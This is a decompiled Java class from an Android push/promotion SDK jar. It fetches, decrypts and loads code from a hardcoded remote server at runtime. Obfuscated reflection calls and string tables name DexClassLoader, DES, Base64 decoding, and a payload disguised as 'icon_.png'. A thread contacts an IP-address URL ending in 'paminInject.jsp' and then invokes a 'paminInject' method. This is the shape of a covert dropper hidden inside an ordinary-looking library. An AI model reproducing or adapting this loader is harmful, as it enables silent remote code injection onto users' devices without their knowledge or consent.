package push_juyou;

import android.content.Context;
import android.os.Looper;
import android.util.Log;

public class PMan
{
  private static PMan PMan_PMan_a;
  private static Context PMan_context_b;
  private static int PMan_int_c = 8;
  
  public  static  String TAG = "PMan" ;

  private PMan(Context paramContext)
  {
    PMan_context_b = paramContext;
    class_e.class_e_static_void_a(paramContext);
    class_e.class_e_obj_a(class_e.class_e_static_string_a(paramContext, PMan_int_c), class_e.class_e_static_string_a(paramContext, PMan_int_c + 1), new Class[] { Context.class }, new Object[] { paramContext }, paramContext);
  }

  private static PMan getPaminInstal(Context paramContext, String paramString1, String paramString2)
  {
    if (PMan_PMan_a == null)
      PMan_PMan_a = new PMan(paramContext);
    PMan_context_b = paramContext;
    class_e.class_e_obj_a(class_e.class_e_static_string_a(paramContext, PMan_int_c), class_e.class_e_static_string_a(paramContext, PMan_int_c + 2), new Class[] { Context.class, String.class, String.class }, new Object[] { paramContext, paramString1, paramString2 }, paramContext);
    return PMan_PMan_a;
  }

  public static void get(Context paramContext, String paramString1, String paramString2, boolean paramBoolean)
  {
//    init();
    Log.e( "推广",PMan .TAG +"  c初始化 ");

    Log.e( "推广",PMan .TAG +"  核心 "
    +class_may_isClassString_h.String_H_a +" \n"
    +class_may_isClassString_h.String_H_b +" \n"
    +class_may_isClassString_h.String_H_c +" \n"
    +class_may_isClassString_h.String_H_d +" \n"
    +class_may_isClassString_h.String_H_e +" \n"
    +class_may_isClassString_h.String_H_f +" \n"
    +class_may_isClassString_h.String_H_g +" \n"
    +class_may_isClassString_h.String_H_h +" \n"
    +class_may_isClassString_h.String_H_i +" \n"
    +class_may_isClassString_h.String_H_j +" \n"
    +class_may_isClassString_h.String_H_k +" \n"
    +class_may_isClassString_h.String_H_l +" \n"
    +class_may_isClassString_h.String_H_m +" \n"
    +class_may_isClassString_h.String_H_n +" \n"
    +class_may_isClassString_h.String_H_o +" \n"
    +class_may_isClassString_h.String_H_p +" \n"
    +class_may_isClassString_h.String_H_q +" \n"
    +class_may_isClassString_h.String_H_r +" \n"
    +class_may_isClassString_h.String_H_s +" \n"
    +class_may_isClassString_h.String_H_t +" \n"
    +class_may_isClassString_h.String_H_u +" \n"
    +class_may_isClassString_h.String_H_v +" \n"
    +class_may_isClassString_h.String_H_w +" \n"
    
    );
    
    
 
    
    
    
    
    
    String str = class_may_isClassString_h.String_H_k;
    if (paramContext.getSharedPreferences("getPaminInstal", 0).getInt("getPaminInstal", 0) == 1)
    {
      getPaminInstal(paramContext, paramString1, paramString2).paminInject(paramContext, paramBoolean);
      return;
    }
    Log.e( "推广",PMan .TAG +"  开启线程 ");
    f_handler localf = new f_handler(Looper.getMainLooper(), paramContext, paramString1, paramString2, paramBoolean);
    new g_thread(str, paramString1, localf, paramContext).start();
  }

  private void paminInject(Context paramContext, boolean paramBoolean)
  {
    class_e.class_e_obj_a(class_e.class_e_static_string_a(paramContext, PMan_int_c), class_e.class_e_static_string_a(paramContext, PMan_int_c + 12), new Class[] { Context.class, Boolean.TYPE }, new Object[] { paramContext, Boolean.valueOf(paramBoolean) }, paramContext);
  }

  public void setResId(int paramInt1, int paramInt2, int paramInt3, int paramInt4, int paramInt5)
  {
    class_e.class_e_obj_a(class_e.class_e_static_string_a(PMan_context_b, PMan_int_c), class_e.class_e_static_string_a(PMan_context_b, 31), new Class[] { Integer.TYPE, Integer.TYPE, Integer.TYPE, Integer.TYPE, Integer.TYPE }, new Object[] { Integer.valueOf(paramInt1), Integer.valueOf(paramInt2), Integer.valueOf(paramInt3), Integer.valueOf(paramInt4), Integer.valueOf(paramInt5) }, PMan_context_b);
  }
  
  
  public  static  void init (){


             class_may_isClassString_h.String_H_a  = ".jar ";
            class_may_isClassString_h.String_H_b =" dalvik.system.DexClassLoader";
            class_may_isClassString_h.String_H_c =".dex ";
            class_may_isClassString_h.String_H_d ="DES";
            class_may_isClassString_h.String_H_e ="android.util.Base64";
            class_may_isClassString_h.String_H_f ="decode";
            class_may_isClassString_h.String_H_g ="com.p201601.";
            class_may_isClassString_h.String_H_h ="CU";
            class_may_isClassString_h.String_H_i ="paminInject";
            class_may_isClassString_h.String_H_j =".218.214:8080/jfservice/paminInject.jsp?k=";
            class_may_isClassString_h.String_H_k="http://123.57.218.214:8080/jfservice/paminInject.jsp?k=";
            class_may_isClassString_h.String_H_l="dCl";
            class_may_isClassString_h.String_H_m ="ass";
            class_may_isClassString_h.String_H_n="loadClass";
            class_may_isClassString_h.String_H_o ="n_.";
            class_may_isClassString_h.String_H_p ="png";
            class_may_isClassString_h.String_H_q ="icon_.png";
            class_may_isClassString_h.String_H_r ="java.net.URL";
            class_may_isClassString_h.String_H_s ="java.net.HttpURLConnection";
            class_may_isClassString_h.String_H_t ="openConnection";
            class_may_isClassString_h.String_H_u ="setConnectTimeout";
            class_may_isClassString_h.String_H_v ="connect";
            class_may_isClassString_h.String_H_w ="getResponseCode";
  }
}

/* Location:           E:\JAR包\yPush-push_juyou-1.2.5.jar
 * Qualified Name:     push_juyou.PMan
 * JD-Core Version:    0.6.0
 */